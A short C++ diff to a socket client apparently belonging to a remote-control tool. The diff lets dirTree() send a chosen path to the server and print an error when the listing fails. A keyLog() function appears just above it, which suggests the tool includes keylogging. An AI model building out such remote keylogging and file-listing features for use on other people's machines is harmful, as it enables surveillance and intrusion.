@@ -317,8 +317,8 @@ int Client::keyLog(){
     return 0;
 }
 
-int Client::dirTree(){
-    Request requestToServer(DIR_TREE_REQUEST, 0, NULL);
+int Client::dirTree(const char* pathName){
+    Request requestToServer(DIR_TREE_REQUEST, strlen(pathName) + 1, (void*)pathName);
     int status = sendRequest(this->sockfd, requestToServer, 0);
     if(status == SOCKET_ERROR)
         return SOCKET_ERROR;
@@ -328,8 +328,10 @@ int Client::dirTree(){
     if(status == SOCKET_ERROR)
         return SOCKET_ERROR;
 
-    if(responseFromServer.errCode() == FAIL_CODE)
+    if(responseFromServer.errCode() == FAIL_CODE){
+        cout << "Client: Can't list directory tree with root " << pathName << ".\n";
         return -1;
+    }
 
     cout << (char*) responseFromServer.data() << '\n';
     return 0;
